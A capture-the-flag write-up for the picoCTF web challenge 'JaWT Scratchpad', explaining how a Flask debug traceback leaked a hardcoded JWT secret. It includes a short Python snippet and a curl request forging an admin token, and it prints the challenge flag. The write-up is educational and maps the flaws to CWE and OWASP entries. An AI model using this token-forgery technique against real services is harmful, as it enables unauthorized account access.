# JaWT Scratchpad

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}`

## Summary

A scratchpad app authenticates users with an HS256-signed JWT stored in a cookie and shows the
flag only when the token's `user` claim is `admin`. An `alg: none` forgery attempt is correctly
rejected by the server's JWT library (PyJWT enforces that `alg: none` tokens must be verified
with a `None` key) — but the app runs with Flask's debugger enabled, and the resulting unhandled
exception's traceback renders the exact source line that verifies the token, including the
hardcoded signing secret in plaintext. With the real secret in hand, a properly HS256-signed
`admin` token is trivial to forge.

## Discovery

Registering with any name issues a cookie:

```
jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdHVzZXIxMjM0In0.<sig>
```

decoding to header `{"typ":"JWT","alg":"HS256"}` and payload `{"user":"testuser1234"}`.

Attempting the classic `alg: none` bypass (empty signature segment, `user: admin`) doesn't grant
access — but instead of a clean auth failure, the server crashes with a Werkzeug debug traceback
(Flask debug mode is enabled in production):

```
Error('When alg = "none", key value must be None.')
  File "/app/server.py", line 30, in index
      user = jwt.decode(cookie, 'ilovepico')["user"]
```

The traceback's inline source view of the failing frame prints the exact call, including the
literal secret string passed to `jwt.decode()`: **`ilovepico`**.

## Proof of Concept

With the real secret known, sign a legitimate HS256 token instead of trying to bypass signature
verification at all:

```python
import jwt
token = jwt.encode({"user": "admin"}, "ilovepico", algorithm="HS256")
```

```
curl -s "http://TARGET/" -H "Cookie: jwt=<forged token>"
```

```html
<textarea>picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}</textarea>
```

## Root Cause

Two independent issues stacked: a hardcoded, weak JWT signing secret, and a debug-mode Flask
deployment that helpfully prints the exact source line (and its literal string arguments) for any
uncaught exception. Either one alone would already be a serious finding; together, triggering the
first (a rejected `alg:none` forgery) directly hands over everything needed to fully defeat the
second, unrelated-looking control (the real signing secret).

## CWE / OWASP

- **CWE-798**: Use of Hard-coded Credentials (JWT signing secret)
- **CWE-209**: Generation of Error Message Containing Sensitive Information (Flask debug
  traceback exposing source code and secrets)
- **OWASP A02:2021**: Cryptographic Failures
- **OWASP A05:2021**: Security Misconfiguration (debug mode enabled in production)
